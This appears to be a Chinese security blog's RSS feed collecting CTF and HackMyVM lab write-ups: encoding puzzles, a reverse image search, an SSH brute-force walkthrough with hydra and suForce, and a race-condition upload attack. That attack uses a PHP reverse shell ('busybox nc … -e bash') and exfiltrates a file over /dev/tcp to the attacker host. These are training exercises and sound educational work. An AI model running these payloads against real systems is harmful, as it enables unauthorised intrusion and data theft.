* 执行解码操作后，我们得到以下 ASCII 明文字符串：

```
hmv{myflagiseasy}
```

### 结果：Flag

解码后的字符串即为本挑战的 Flag。

```
hmv{myflagiseasy}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20004%20-shi-liu-jin-zhi-de-mi-mi.html</guid><pubDate>Fri, 27 Jun 2025 09:28:48 +0000</pubDate></item><item><title>Challenge 003 图中是谁？</title><link>https://7r1UMPHK.github.io/post/Challenge%20003%20-tu-zhong-shi-shui-%EF%BC%9F.html</link><description>### 挑战信息

*   **挑战名称/编号:** Challenge 003
*   **挑战链接:** [https://hackmyvm.eu/challenges/challenge.php?c=003](https://hackmyvm.eu/challenges/challenge.php?c=003)

### 初始观察

![挑战003界面及问题](https://7r1umphk.github.io/image/20250502150751314.png)

访问挑战页面后，页面显示一个问题 'Who is she?'（她是谁？），并附带了一张人物照片。同时，页面给出了 Flag 的格式要求：`HMV{namelastname}`，并举例 `HMV{johnwick}`。这表明我们需要识别出图片中的人物，并将其姓名按照“名姓”（小写，无空格）的格式填入 Flag 中。

图片内容如下：

![挑战003中的人物图片](https://7r1umphk.github.io/image/20250502150641114.jpg)

### 分析与技术说明

该挑战的核心任务是**通过图像识别特定人物**。这是一个典型的**开源情报（Open Source Intelligence, OSINT）**收集场景，特别是在涉及图像信息时。解决此类问题的常用且有效的技术是**反向图像搜索 (Reverse Image Search)**。

**反向图像搜索**是一种允许用户使用图像作为查询条件来搜索互联网的技术。与输入关键词查找相关文本或图像不同，用户上传一张图片或提供图片的 URL，搜索引擎会查找与该图片相同或视觉上相似的图片，并可能提供关于图片来源、内容以及相关网页的信息。

常用的反向图像搜索服务包括：

*   Google Images (谷歌图片搜索)
*   TinEye
*   Bing Visual Search (必应视觉搜索)
*   Yandex Images

### 求解过程

1. **执行反向搜索:** 我们选择使用 **Google Images** 进行反向搜索。访问 Google Images 网站 ([https://images.google.com/](https://images.google.com/))，点击搜索框中的相机图标（Search by image），然后粘贴图片的 URL 或上传已保存的图片文件。
2. **分析结果:** Google Images 的搜索结果迅速识别出了图片中的人物。

   ![Google图片搜索结果](https://7r1umphk.github.io/image/20250502151052521.png)

   搜索结果明确指出该人物是 **Gata Cattana**。

3. **格式化 Flag:** 根据挑战要求的 `HMV{namelastname}` 格式，我们需要将姓名 'Gata Cattana' 转换为小写并去除空格，得到 `gatacattana`。将其放入 `HMV{}` 中。

### 结果：Flag

最终得到的 Flag 是：

```
HMV{gatacattana}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20003%20-tu-zhong-shi-shui-%EF%BC%9F.html</guid><pubDate>Fri, 27 Jun 2025 09:28:45 +0000</pubDate></item><item><title>hackmyvm靶场-Bruteforcelab</title><link>https://7r1UMPHK.github.io/post/hackmyvm-ba-chang--Bruteforcelab.html</link><description># 简介

![image-20250322203846278](https://7r1umphk.github.io/image/20250322203846321.png)

靶机：[Bruteforcelab](https://hackmyvm.eu/machines/machine.php?vm=Bruteforcelab)
 难度：绿色
 目标 IP：192.168.205.164
 本机 IP：192.168.205.128
 知识点：'旨在用于练习暴力破解和 SMB 服务利用。'

# 一：信息收集

## 1.nmap扫描

开扫！

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n -p- -T4 192.168.205.164
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 20:39 CST
Nmap scan report for 192.168.205.164
Host is up (0.00033s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1c:db:f8:92:72:c4:72:dc:24:c3:ca:7c:80:eb:f4:81 (RSA)
|   256 7f:30:33:e2:f4:0d:87:41:5e:a3:24:de:57:c6:73:8b (ECDSA)
|_  256 9a:9e:2f:53:e0:2b:b4:98:3f:34:95:53:56:87:a4:76 (ED25519)
10000/tcp open  http        MiniServ 2.021 (Webmin httpd)
|_http-server-header: MiniServ/2.021
|_http-title: 200 &amp;mdash; Document follows
19000/tcp open  netbios-ssn Samba smbd 4
19222/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:DB:B7:99 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.33 ms 192.168.205.164

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.38 seconds
```

显示开放了22、10000、19000、19222端口，开启了ssh、http、smb服务

## 2.SMB服务探测

个人比较喜欢先看smb服务。使用smbclient进行探测

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbclient -L //192.168.205.164 -p 19000 
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Test            Disk      
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.205.164 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available

```

发现存在Test共享目录，连接后发现存在README.txt

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbclient //192.168.205.164/Test -p 19000
Password for [WORKGROUP\kali]:
Try 'help' to get a list of possible commands.
smb: \&gt; ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \&gt; ls
  .                                   D        0  Mon Mar 27 03:06:46 2023
  ..                                  D        0  Mon Mar 27 02:12:02 2023
  README.txt                          N      115  Mon Mar 27 03:06:46 2023

                9232860 blocks of size 1024. 3032372 blocks available

```

查看README.txt，发现其存在用户名

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat README.txt   
Hey Andrea listen to me, I'm going to take a break. I think I've setup this prototype for the SMB server correctly

```

*嘿 Andrea 听我说，我要休息一下。我想我已经正确地为 SMB 服务器设置了这个原型*

# 二：信息利用

使用hydra暴力破解ssh服务，建议使用xato-net-10-million-passwords-10000.txt字典，rockyou.txt字典可能会存在缺失的可能

```bash
┌──(kali㉿kali)-[~/test]
└─$ hydra -l andrea -P xato10000.txt ssh://192.168.205.164 -I -u -f -e nsr -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-22 20:55:54
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10003 login tries (l:1/p:10003), ~157 tries per task
[DATA] attacking ssh://192.168.205.164:22/
[STATUS] 635.00 tries/min, 635 tries in 00:01h, 9401 to do in 00:15h, 31 active
[22][ssh] host: 192.168.205.164   login: andrea   password: awesome
[STATUS] attack finished for 192.168.205.164 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-22 20:57:20

```

# 三：获取shell

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh andrea@192.168.205.164               
The authenticity of host '192.168.205.164 (192.168.205.164)' can't be established.
ED25519 key fingerprint is SHA256:jxCJlAEwfgAbyE4RC2RJnQM/Y0rUXe+Yt6q7Y69okUg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:19: [hashed name]
    ~/.ssh/known_hosts:29: [hashed name]
    ~/.ssh/known_hosts:30: [hashed name]
    ~/.ssh/known_hosts:31: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.164' (ED25519) to the list of known hosts.
andrea@192.168.205.164's password: 
Linux LAB-Bruteforce 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 26 21:26:42 2023 from 192.168.1.84
andrea@LAB-Bruteforce:~$ id
uid=1001(andrea) gid=1001(andrea) groups=1001(andrea)
andrea@LAB-Bruteforce:~$ whoami 
andrea
andrea@LAB-Bruteforce:~$ hostname -I
192.168.205.164 

```

# 四：提权-root

使用suFirce工具直接爆破root

## 1.准备

```bash
andrea@LAB-Bruteforce:~$ cd /tmp/
andrea@LAB-Bruteforce:/tmp$ wget 192.168.205.128/suForce
--2025-03-22 14:05:42--  http://192.168.205.128/suForce
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2430 (2.4K) [application/octet-stream]
Saving to: ‘suForce’

suForce                           100%[============================================================&gt;]   2.37K  --.-KB/s    in 0s      

2025-03-22 14:05:42 (4.78 MB/s) - ‘suForce’ saved [2430/2430]

andrea@LAB-Bruteforce:/tmp$ wget 192.168.205.128/xato10000.txt
--2025-03-22 14:05:54--  http://192.168.205.128/xato10000.txt
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 76497 (75K) [text/plain]
Saving to: ‘xato10000.txt’

xato10000.txt                     100%[============================================================&gt;]  74.70K  --.-KB/s    in 0s      

2025-03-22 14:05:54 (379 MB/s) - ‘xato10000.txt’ saved [76497/76497]

andrea@LAB-Bruteforce:/tmp$ chmod +x suForce 

```

## 2.撞击

```bash
andrea@LAB-Bruteforce:/tmp$ ./suForce -u root -w xato10000.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | root
📖 Wordlist | xato10000.txt
🔎 Status   | 3412/10000/34%/1998
💥 Password | 1998
───────────────────────────────────


andrea@LAB-Bruteforce:/tmp$ su -
Password: 
root@LAB-Bruteforce:~# id
uid=0(root) gid=0(root) groups=0(root)

```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hackmyvm-ba-chang--Bruteforcelab.html</guid><pubDate>Fri, 27 Jun 2025 09:28:35 +0000</pubDate></item><item><title>Challenge 002 源码之密</title><link>https://7r1UMPHK.github.io/post/Challenge%20002%20-yuan-ma-zhi-mi.html</link><description>### 挑战信息

*   **挑战名称/编号:** Challenge 002
*   **挑战链接:** [https://hackmyvm.eu/challenges/challenge.php?c=002](https://hackmyvm.eu/challenges/challenge.php?c=002)

### 初始观察

![挑战002初始界面](https://7r1umphk.github.io/image/20250502150050288.png)

访问挑战页面后，页面内容提示我们需要访问另一个特定的 URL 来获取 Flag。同时，页面明确指出**无需进行暴力破解 (No Bruteforce required)**。

提供的目标 URL 为： `http://momo.hackmyvm.eu/ch4ll3ng3002/`

### 分析与技术说明

根据指示，我们访问了目标 URL `http://momo.hackmyvm.eu/ch4ll3ng3002/`。该页面呈现一个简单的 HTML 表单，要求用户输入密码以获取 Flag。

鉴于挑战明确排除了暴力破解的可能性，这强烈暗示所需密码并非通过猜测或字典攻击获得，而是可能以某种非显而易见的方式隐藏在当前页面或其关联资源中。在 Web 安全领域，检查客户端侧资源，特别是 **HTML 源代码**，是发现此类信息的常用技术手段。

Web 浏览器在渲染页面时会解析 HTML 代码，但源代码本身包含了开发者编写的所有标记和注释。开发者有时会在注释中留下调试信息、说明甚至是敏感数据。

### 解码/求解过程

我们在浏览器中对目标页面 `http://momo.hackmyvm.eu/ch4ll3ng3002/` 执行“查看网页源代码”操作。仔细检查源代码后，在 `&lt;form&gt;` 元素内部发现了一段被 `&lt;!--` 和 `--&gt;` 包裹的 **HTML 注释**：

```html
&lt;!doctype html&gt;
&lt;html lang='en'&gt;
&lt;title&gt;002&lt;/title&gt;
Password to obtain the flag.
    &lt;form class='form-signin' action='passcheck.php' method='post'&gt;
      &lt;input type='password' name='password' id='password' placeholder='Password' required&gt;
      &lt;input type='submit' value='Send'&gt;
      &lt;!-- isthisthepassword? --&gt;  &lt;!-- 此处发现注释内容 --&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

该注释内容为：

```
isthisthepassword?
```

这段文本极有可能就是寻找的密码。我们将此字符串 `isthisthepassword?` 填入页面的密码输入框，并提交表单。

服务器验证通过后，返回了包含 Flag 的页面。

### 结果：Flag

成功获取的 Flag 为：

```
HMV{thatwasreallyeazy}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20002%20-yuan-ma-zhi-mi.html</guid><pubDate>Fri, 27 Jun 2025 09:28:32 +0000</pubDate></item><item><title>Challenge 001 Base64 编码解析</title><link>https://7r1UMPHK.github.io/post/Challenge%20001%20Base64%20-bian-ma-jie-xi.html</link><description>### 挑战信息

*   **挑战名称/编号:** Challenge 001
*   **挑战链接:** [https://hackmyvm.eu/challenges/challenge.php?c=001](https://hackmyvm.eu/challenges/challenge.php?c=001)

### 初始观察

![挑战001界面](https://7r1umphk.github.io/image/20250502145552213.png)

访问挑战页面后，我们看到页面上给出了一个字符串：

```
aG12e2Jhc2U2NGRlY29kZXJ9
```


任务显然是需要对这个字符串进行解码或解释，以获取 Flag。

### 分析与技术说明

给出的字符串 `aG12e2Jhc2U2NGRlY29kZXJ9` 具有 **Base64 编码**的典型特征：

1.  **字符集:** 它完全由大写字母 (`A-Z`)、小写字母 (`a-z`) 和数字 (`0-9`) 组成。完整的 Base64 字符集还包括 `+` 和 `/` 字符，并使用 `=` 作为填充符，不过这些特殊字符并未出现在本例的字符串中。
2.  **用途:** 需要明确的是，Base64 是一种**编码（Encoding）**方案，而不是**加密（Encryption）**方法。它的主要目的是将**二进制数据**（例如图片、可执行文件或任意字节序列）转换为**纯文本**格式，以便在只支持文本传输的媒介上传输。这对于像电子邮件（MIME 协议）、XML 或 JSON 等基于文本的格式中嵌入二进制数据至关重要。
3.  **原理简述:** Base64 的工作原理是将输入的**每 3 个字节（24 比特）**的数据转换为 **4 个 Base64 字符**。每个 Base64 字符代表原始数据中的 6 个比特（因为 2 的 6 次方等于 64，对应 Base64 的 64 个基本字符）。如果输入数据的字节数不是 3 的倍数，通常会在编码结果的末尾添加一个或两个 `=` 填充符，用来指示原始数据的精确长度。本例中字符串末尾没有 `=`，这表示原始数据的字节数恰好是 3 的倍数。

### 解码过程

我们可以使用多种工具来解码 Base64 字符串。**CyberChef** 是一个功能强大且广受欢迎的选择：

1.  **访问** CyberChef 网站: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
2.  **输入 (Input):** 将字符串 `aG12e2Jhc2U2NGRlY29kZXJ9` 粘贴到“Input”输入框中。
3.  **选择操作 (Operations):** 在左侧的操作列表中搜索 'From Base64'，然后将其拖拽到“Recipe”区域。
4.  **输出 (Output):** “Output”区域将自动显示解码后的结果。

当然，也可以使用命令行工具：

*   在 Linux/macOS 系统下：
    ```bash
    echo 'aG12e2Jhc2U2NGRlY29kZXJ9' | base64 -d
    ```
* 执行解码操作后，我们得到以下明文字符串：

```
hmv{base64decoder}
```

### 结果：Flag

解码后的字符串即为本挑战的 Flag。

```
hmv{base64decoder}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20001%20Base64%20-bian-ma-jie-xi.html</guid><pubDate>Fri, 27 Jun 2025 09:28:30 +0000</pubDate></item><item><title>7r1umph 靶机渗透测试报告 (Write-up)</title><link>https://7r1UMPHK.github.io/post/7r1umph%20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-up%29.html</link><description>## 1. 目标信息

*   **靶机名称:** 7r1umph (未发布，内部测试靶机，可能后续发布于 HackMyVm)
*   **难度**: easy
*   **靶机IP:** 192.168.205.187 (通过`arp-scan`发现)
*   **攻击机IP:** 192.168.205.128 (Kali Linux)

## 2. 信息收集

### 2.1 主机发现

使用 `arp-scan` 在本地网络中发现存活主机。

```bash
sudo arp-scan -l
```

输出显示目标IP `192.168.205.187` 对应MAC地址 `08:00:27:73:20:ed` (Oracle VirtualBox)。

### 2.2 端口扫描

使用 `nmap` 对目标IP进行全端口扫描，识别开放的服务。

```bash
nmap -p- 192.168.205.187
```

扫描结果显示开放了以下端口：

*   **22/tcp:** SSH
*   **80/tcp:** HTTP

### 2.3 Web目录扫描

使用 `gobuster` 对Web服务进行目录和文件扫描。

```bash
gobuster dir -u http://192.168.205.187/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,md,html
```

扫描发现了以下重要路径：

*   `/index.html` (Status: 200)
*   `/info.php` (Status: 200) - PHP信息泄露页面
*   `/index.php` (Status: 200) - 发现是一个文件上传页面
*   `/upload/` (Status: 301 -&gt; Directory) - 推测为上传文件的存储目录
*   `/tmp/` (Status: 301 -&gt; Directory) - 功能未知的目录，也像文件仓库

### 2.4 Web服务探索

*   访问 `http://192.168.205.187/` 显示 'index'，对应 `/index.html` 的内容。
*   访问 `http://192.168.205.187/index.php` 确认是一个文件上传表单。
*   尝试上传一个PHP Webshell (`shell.php`)。

![文件上传页面截图](https://7r1umphk.github.io/image/20250412184148968.png)

上传后发现文件出现在 `/upload/` 目录下，但文件名被修改为 `shell.php.dsz`，无法直接执行。同时观察到 `/tmp/` 目录没有文件常驻。

通过抓包分析上传过程，确认了POST请求的结构，但没有发现明显的绕过线索。

进一步测试发现，上传的文件会以**原始文件名**短暂地出现在 `/tmp/` 目录下（大约1秒），然后才被移动到 `/upload/` 并重命名。这存在一个**条件竞争 (Race Condition)** 漏洞。

## 3. 漏洞利用 (条件竞争获取初始访问)

### 3.1 制定策略

利用文件在 `/tmp/` 目录短暂存在的特性，上传一个能反弹Shell的PHP文件，并在它被处理前通过HTTP请求访问它，触发反弹Shell。

### 3.2 准备工具

1. **反弹Shell Payload (`shell.php`):**
   使用一个简单的 `exec` 调用 `busybox nc` 来反弹shell（经过测试发现这个比较可靠）。

   ```php
   &lt;?php
   exec('busybox nc 192.168.205.128 8888 -e bash');
   ?&gt;
   ```

2. **条件竞争访问脚本 (`a.sh`):**
   编写一个Bash脚本，持续请求目标临时文件，直到成功（HTTP状态码 200）。

   ```bash
   #!/bin/bash
   url='http://192.168.205.187/tmp/shell.php'
   max_attempts=1000 # 可以根据需要调整尝试次数
   success=false
   
   echo '开始尝试访问 $url ...'
   
   # 并行执行上传和访问尝试以增加成功率
   # 在另一个终端执行上传操作
   
   for ((i=1; i&lt;=max_attempts; i++)); do
       # 发送请求并捕获状态码
       status_code=$(curl -s -o /dev/null -w '%{http_code}' '$url')
   
       echo '尝试 $i: 状态码 = $status_code'
   
       # 检测到200时标记成功并退出循环
       if [[ '$status_code' -eq 200 ]]; then
           echo '成功访问! $url 返回 200 OK.'
           success=true
           break
       fi
   
       # 短暂暂停避免过于频繁的请求 (可选)
       sleep 0.05 # 缩短间隔增加命中机会
   done
   
   if [[ '$success' == true ]]; then
       echo '已触发Payload，请检查监听器。'
   else
       echo '在 $max_attempts 次尝试后未能成功访问。'
   fi
   ```

   *(注：原脚本在检测到200后会暂停，这里修改为直接提示成功)*

3. **Netcat 监听器:**
   在Kali攻击机上开启 `nc` 监听指定端口（8888）。

   ```bash
   nc -lvnp 8888
   ```

4. **Burp Suite (或 `curl`):**
   用于发送包含反弹Shell Payload的文件上传POST请求。

### 3.3 执行攻击

1. 在一个终端运行 `nc -lvnp 8888`。

2. 在另一个终端运行 `bash a.sh` 开始循环访问。

3. 使用Burp Suite Repeater (或 `curl`) 发送构造好的文件上传POST请求到 `http://192.168.205.187/index.php`，内容包含上面的 `shell.php` Payload。

   ```http
   POST /index.php HTTP/1.1
   Host: 192.168.205.187
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   Accept-Encoding: gzip, deflate, br
   Referer: http://192.168.205.187/index.php
   Content-Type: multipart/form-data; boundary=---------------------------185067380923233129002267529642
   Content-Length: 287  # 注意根据实际payload调整
   Origin: http://192.168.205.187
   Connection: keep-alive
   Upgrade-Insecure-Requests: 1
   Priority: u=0, i
   
   -----------------------------185067380923233129002267529642
   Content-Disposition: form-data; name='file'; filename='shell.php'
   Content-Type: application/x-php
   
   &lt;?php
   exec('busybox nc 192.168.205.128 8888 -e bash');
   ?&gt;
   
   -----------------------------185067380923233129002267529642--
   ```

4. 观察 `a.sh` 的输出。当看到 `状态码 = 200` 时，检查 `nc` 监听器窗口，应该已经收到了反弹Shell。

   ```bash
   ┌──(kali㉿kali)-[~/test]
   └─$ nc -lvnp 8888
   listening on [any] 8888 ...
   connect to [192.168.205.128] from (UNKNOWN) [192.168.205.187] 58348
   id
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   pwd
   /var/www/html/tmp
   ```

### 3.4 Shell 稳定化

获取到的Shell通常是非交互式的，需要进行稳定化处理以便更好地操作。

```bash
script /dev/null -c bash
# 按 Ctrl+Z 挂起
stty raw -echo; fg
# 按 Enter
reset xterm
export TERM=xterm
export SHELL=/bin/bash
# 根据需要调整行列数
stty rows 59 cols 236
```

现在我们有了一个稳定的 `www-data` 用户的Shell。

## 4. 权限提升

### 4.1 本地枚举 (www-data)

进行基本的系统枚举。

```bash
www-data@7r1umph:/var/www/html/tmp$ ls -la /home
total 12
drwxr-xr-x  3 root    root    4096 Apr 11 22:27 .
drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..
drwx------  3 welcome welcome 4096 Apr 12 01:29 welcome # 发现用户 welcome

www-data@7r1umph:/home$ sudo -l
sudo: unable to resolve host 7r1umph: Name or service not known
[sudo] password for www-data: # 需要密码，无法使用sudo

www-data@7r1umph:/home$ cd /opt/
www-data@7r1umph:/opt$ ls -la
total 56
drwxr-xr-x  2 root root  4096 Apr 12 01:23 .
drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
-rw-r--r--  1 root root 16968 Apr 12 00:21 guess       # 可疑文件
-rw-r--r--  1 root root 27871 Apr 12 00:18 yeyeye.png  # 可疑图片文件
```

### 4.2 提权至 welcome 用户

发现 `/opt` 目录下有一个图片文件 `yeyeye.png`。将其传回Kali进行分析。

**在Kali上准备接收:**

```bash
nc -lvnp 4444 &gt; yeyeye.png
```

**在靶机上发送:**

```bash
www-data@7r1umph:/opt$ cat yeyeye.png &gt; /dev/tcp/192.168.205.128/4444
```

在Kali上查看图片 `yeyeye.png`:

![Dorabella Cipher 图片](https://7r1umphk.github.io/image/20250412190141508.png)

通过图片内容和网络搜索 (Google识图等)，可以识别出这是一种名为 **Dorabella Cipher** 的密码。

参考在线资料（ 如提供的链接 https://geocachen.nl/geocaching/geocache-puzzels-oplossen/dorabella-cipher/ ）进行破译，得到密码：`yecongdong`。

使用这个密码尝试切换到 `welcome` 用户。

```bash
www-data@7r1umph:/opt$ su welcome
Password: yecongdong
$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
$ # 成功切换到 welcome 用户
```

(可选) 为了获得更好的交互体验，可以使用 `welcome:yecongdong` 通过SSH登录靶机。

### 4.3 获取 User Flag

在 `welcome` 用户家目录下查找 `user.txt`。

```bash
welcome@7r1umph:~$ pwd
/home/welcome
welcome@7r1umph:~$ ls -la
total 32
drwx------ 3 welcome welcome 4096 Apr 12 01:29 .
drwxr-xr-x 3 root    root    4096 Apr 11 22:27 ..
# ... 其他文件 ...
-rw-r--r-- 1 root    root      44 Apr 12 00:17 user.txt # 找到 user flag 文件
# ... 其他文件 ...
welcome@7r1umph:~$ cat user.txt
flag{user-d650b42437edc28dfd3637c4ccd445ec}
```

成功获取 `user.flag`。

### 4.4 本地枚举 (welcome)

继续在 `welcome` 用户下进行枚举，寻找提权至 `root` 的线索。发现在家目录下有一个 `RegView` 目录。

```bash
welcome@7r1umph:~$ cd RegView/
welcome@7r1umph:~/RegView$ ls -al
total 476
drwxr-xr-x 3 root    root      4096 Apr 12 01:32 .
drwx------ 3 welcome welcome   4096 Apr 12 01:29 ..
drwxr-xr-x 8 root    root      4096 Apr 12 01:33 .git   # 发现 .git 目录
# ... 其他文件 ...
-rwxr-xr-x 1 root    root      3911 Apr 12 01:02 RegView.sh
# ... 其他文件 ...
```

发现 `.git` 目录，表明这是一个Git仓库，可能包含历史信息。

### 4.5 提权至 root 用户

检查Git仓库的历史记录。

```bash
welcome@7r1umph:~/RegView$ git log -p
```

在 `git log` 的输出中，发现了一个历史提交记录，其中删除了一个名为 `source2.txt` 的文件，该文件内容包含了一个看起来像凭证的字符串：

```diff
commit acd806aad21acb61112252234c7707bc8a74dd3c (HEAD -&gt; main)
Author: bamuwe &lt;bamuwe@qq.com&gt;
Date:   Sat Apr 12 01:33:50 2025 -0400

    fix bug

diff --git a/source2.txt b/source2.txt
deleted file mode 100644
index fca9fc6..0000000
--- a/source2.txt
+++ /dev/null
@@ -1 +0,0 @@
-root:ff855ad811c79e5fba458a575fac5b83

# ... 其他提交记录 ...
```

发现了 `root` 用户的凭证信息：`root:ff855ad811c79e5fba458a575fac5b83`。
这里的 `ff855ad811c79e5fba458a575fac5b83` 看起来像一个哈希值。

同时，联想到之前在 `/opt` 目录下发现的 `guess` 文件。可以尝试计算该文件的MD5值：

```bash
welcome@7r1umph:~/RegView$ md5sum /opt/guess
ff855ad811c79e5fba458a575fac5b83  /opt/guess
```

发现 `guess` 文件的MD5值与Git历史记录中泄露的 `root` 密码（或哈希）完全一致。在CTF中，有时哈希值本身就是密码。尝试使用这个哈希值作为 `root` 密码。

```bash
welcome@7r1umph:~/RegView$ su -
Password: ff855ad811c79e5fba458a575fac5b83
root@7r1umph:~# id
uid=0(root) gid=0(root) groups=0(root)
# 成功切换到 root 用户
```

### 4.6 获取 Root Flag

切换到 `root` 用户后，在其家目录下查找 `root.txt`。

```bash
root@7r1umph:~# cat /root/root.txt
flag{root-ff855ad811c79e5fba458a575fac5b83}
```

成功获取 `root.flag`。

## 5. 总结

本次渗透测试通过以下步骤完成：

1.  **信息收集:** 使用 `arp-scan` 和 `nmap` 发现目标及开放端口 (SSH, HTTP)。`gobuster` 发现Web目录结构，包括文件上传点 `/index.php` 和两个目录 `/upload/`、`/tmp/`。
2.  **初始访问:** 利用文件上传功能中存在的条件竞争漏洞，上传反弹Shell的PHP文件，并在其被移动/重命名之前通过访问 `/tmp/` 目录下的临时文件触发，获得 `www-data` 用户的Shell。
3.  **权限提升 (www-data -&gt; welcome):** 在 `/opt` 目录发现图片文件 `yeyeye.png`，分析识别为 Dorabella Cipher，破译得到 `welcome` 用户的密码 `yecongdong`，成功切换用户。
4.  **权限提升 (welcome -&gt; root):** 在 `welcome` 用户家目录下的 `RegView` 目录中发现 `.git` 仓库。通过 `git log -p` 查看历史记录，发现一个被删除的文件曾包含 `root` 的密码哈希 `ff855ad811c79e5fba458a575fac5b83`。同时确认该哈希与 `/opt/guess` 文件的MD5值相同。使用该哈希作为密码，成功切换到 `root` 用户。
5.  **获取Flag:** 分别在 `welcome` 和 `root` 用户家目录下找到 `user.txt` 和 `root.txt`，获取最终的Flag。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/7r1umph%20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-up%29.html</guid><pubDate>Fri, 27 Jun 2025 09:28:25 +0000</pubDate></item><item><title>🌟 站点美化升级完成通告</title><link>https://7r1UMPHK.github.io/post/%F0%9F%8C%9F%20-zhan-dian-mei-hua-sheng-ji-wan-cheng-tong-gao.html</link><description>![](https://7r1umphk.github.io/image/20250321105722076.png)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/%F0%9F%8C%9F%20-zhan-dian-mei-hua-sheng-ji-wan-cheng-tong-gao.html</guid><pubDate>Fri, 27 Jun 2025 09:28:21 +0000</pubDate></item><item><title>群主题后续 `-ne` 绕过 - 变量解析与 Python 2 `input()` 的启示</title><link>https://7r1UMPHK.github.io/post/qun-zhu-ti-hou-xu-%20%60-ne%60%20-rao-guo-%20-%20-bian-liang-jie-xi-yu-%20Python%202%20%60input%28%29%60%20-de-qi-shi.html</link><description>## 前言

在之前的 [WP](https://7r1umph.github.io/post/qun-zhu-ti.html) 中，我们讨论了如何通过输入非整数字符串（如 `aaa`）来绕过 Bash 脚本中 `[[ '$INPUTS' -ne '$a' ]]` 的随机数检查。其原理是 `-ne` 算术比较在遇到非整数时操作失败，导致 `[[` 命令返回非零退出状态，进而使 `if` 条件判断为假。然而，与群内大佬 '云淡_风清' 的交流以及他给出的 `[[ a -ne '$a' ]]` 示例，引导我们从另一个角度思考这个问题，并联想到了 Python 2 `input()` 的行为。

## 挑战脚本回顾

```bash
#!/bin/bash
# challenge2.sh

PATH=/usr/bin
a=$((RANDOM%100)) # 随机数变量名为 'a'
echo $a
read -r INPUTS

# 关键检查点: 注意 $INPUTS 是带引号的
if [[ '$INPUTS' -ne '$a' ]]; then
    exit 1
fi

echo '验证通过!'
# ... 后续 eval 注入 ...
```

## 大佬的视角：`[[ a -ne '$a' ]]` 的深意

